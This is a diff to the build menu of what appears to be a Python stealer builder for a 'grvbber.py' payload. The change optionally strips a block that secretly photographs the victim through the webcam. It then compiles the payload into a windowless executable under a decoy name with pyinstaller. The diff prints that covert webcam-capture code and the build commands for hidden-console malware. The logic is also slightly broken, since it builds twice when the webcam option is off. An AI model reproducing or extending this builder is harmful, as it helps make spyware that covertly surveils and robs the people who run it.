@@ -182,7 +182,31 @@ def menu():
                 applysettings()
                 Logging.info('Turning into an exe')
                 os.system('pip install -r requirements.txt')
-                os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py')
+                with open('grvbber.py', 'r', encoding='utf-8') as f:
+                    content = f.read()
+                if not config['webcam']:
+                    content = content.replace("""    global webcam_success
+    if config.webcam:
+        import cv2
+        cam_ = os.path.join(output, 'System', 'Webcam.png')
+        os.makedirs(os.path.dirname(cam_), exist_ok=True)
+        try:
+            cap = cv2.VideoCapture(0)
+            ret, frame = cap.read()
+            if ret:
+                cv2.imwrite(cam_, frame)
+                webcam_success = 1
+            else:
+                webcam_success = 0
+            cap.release()
+        except:
+            webcam_success = 0""", '    ...')
+                    with open('built.py', 'w', encoding='utf-8') as f:
+                        f.write(content)
+                    os.system('pyinstaller --onefile --noconsole --exclude-module cv2 --name CharlieKirk --i NONE built.py')
+                with open('built.py', 'w', encoding='utf-8') as f:
+                    f.write(content)
+                os.system('pyinstaller --onefile --noconsole --name CharlieKirk --i NONE built.py')
                 try:
                     os.startfile('dist')
                 except Exception as e:
